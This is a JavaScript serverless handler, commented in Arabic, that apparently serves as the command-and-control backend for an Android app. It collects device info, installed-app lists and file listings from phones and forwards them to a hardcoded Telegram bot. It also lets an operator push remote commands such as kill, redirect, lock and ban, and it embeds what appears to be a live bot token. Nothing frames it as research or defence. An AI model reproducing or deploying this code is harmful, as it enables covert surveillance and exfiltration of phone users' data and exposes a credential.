const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let activeDevice = "";
let keyExpiryTime = 0;
let totalAttempts = 0;
let recentLogs = [];
let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           const chunk = text.substring(i, i + maxLength);
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: chunk })
           }).catch(() => {});
        }
      } else {
        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
        if (keyboard) payload.reply_markup = keyboard;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
        }).catch(() => {});
      }
    }
  };

  try {
    // ==========================================
    // 1. مسارات التطبيق (App Endpoints)
    // ==========================================
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      return res.status(200).send(`"${saved || 'lock'}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      return res.status(200).send(`"${saved || '1234'}"`);
    }
    if (type === 'message') return res.status(200).send(`"التطبيق مقفول من طرف الإدارة."`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }

    if (type === 'command') {
      // === إصلاح مشكل الوقت ===
      if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
        if (Date.now() > keyExpiryTime) {
          // الوقت سالى، نصيفطو killapp مرة وحدة وكنمسحو الوقت
          keyExpiryTime = 0;
          activeDevice = "";
          await kvCmd('SET', 'is_single_use', '0');
          return res.status(200).send('"killapp:1"');
        }
      }
      
      const cmd = remoteCommand;
      remoteCommand = ""; // مسح الأمر باش ما يتنفذش كل مرة
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, '');
          
          if (type === 'key') {
            await kvCmd('SET', 'app_secret_key', cleanBody);
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          }
          
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop();
            await kvCmd('INCR', 'total_attempts');
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
            
            if (cleanBody.includes('success')) {
              const match = cleanBody.match(/Device:\s*([a-zA-Z0-9]+)/);
              const devId = match ? match[1] : null;
              const isSingleUse = await kvCmd('GET', 'is_single_use');
              
              if (devId && isSingleUse === '1') {
                  activeDevice = devId;
                  const duration = parseInt(await kvCmd('GET', 'key_duration') || "0");
                  if (duration > 0) {
                      keyExpiryTime = Date.now() + (duration * 60000);
                  }
                  await kvCmd('SET', 'app_secret_key', 'EXPIRED_KEY');
                  await kvCmd('SET', 'is_single_use', '0');
                  await sendToTelegram(`⏱️ *المفتاح استعمل!*\nالجهاز: \`${devId}\`\nغادي يتقفل التطبيق بعد \`${duration}\` دقيقة.`);
              }
            }
          }
          
          if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
          if (type === 'applist') await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
          if (type === 'files') await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
          
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    // ==========================================
    // 2. التحكم من التيليجرام (Telegram Webhook)
    // ==========================================
    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      switch (command) {
        case '/start': case '/menu': 
          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
          break;
        
        case '/help': 
          await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
            `⚡ *الأوامر الحقيقية:*\n` +
            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
            `⏱️ *التحكم بالوقت:*\n` +
            `/gentime <minutes> - إنشاء مفتاح بوقت محدد\n` +
            `/settime <minutes> - تحديد وقت للمفتاح الحالي\n` +
            `/unbanall - فك الحظر عن الجميع\n` +
            `/unlock - فتح التطبيق\n` +
            `/setkey 1234 - إرجاع الكود الافتراضي\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banall /banlist`); 
          break;
        
        // === أوامر الوقت (المصححة) ===
        case '/gentime':
          if(args[1]) {
            const minutes = parseInt(args[1]);
            const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
            await kvCmd('SET', 'app_secret_key', newKey);
            await kvCmd('SET', 'key_duration', minutes);
            await kvCmd('SET', 'is_single_use', '1');
            activeDevice = ""; 
            keyExpiryTime = 0;
            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة\nملاحظة: كيتقفل التطبيق أوتوماتيكياً ملي تنقضي المدة.`);
          } else await sendToTelegram("⚠️ استعمل: `/gentime 60` (لمدة 60 دقيقة)");
          break;
          
        case '/settime':
          if(args[1]) {
            const minutes = parseInt(args[1]);
            await kvCmd('SET', 'key_duration', minutes);
            await kvCmd('SET', 'is_single_use', '1');
            keyExpiryTime = 0; 
            activeDevice = "";
            await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
          } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
          break;

        // === أوامر التحكم ===
        case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
        case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
        case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
        case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
        case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
        case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
        case '/sysinfo': remoteCommand = "sysinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting basic info...*"); break;
        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
        
        // === الحالة (مصححة باش تحيد الحظر) ===
        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
        case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "1234"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
        
        // === الحظر (مصحح) ===
        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
        
        // === إحصائيات ===
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
        
        default:
          if (command.startsWith('/')) {
            await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
          } else {
            await sendToTelegram("❓ أمر غير معروف. كتب /help");
          }
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
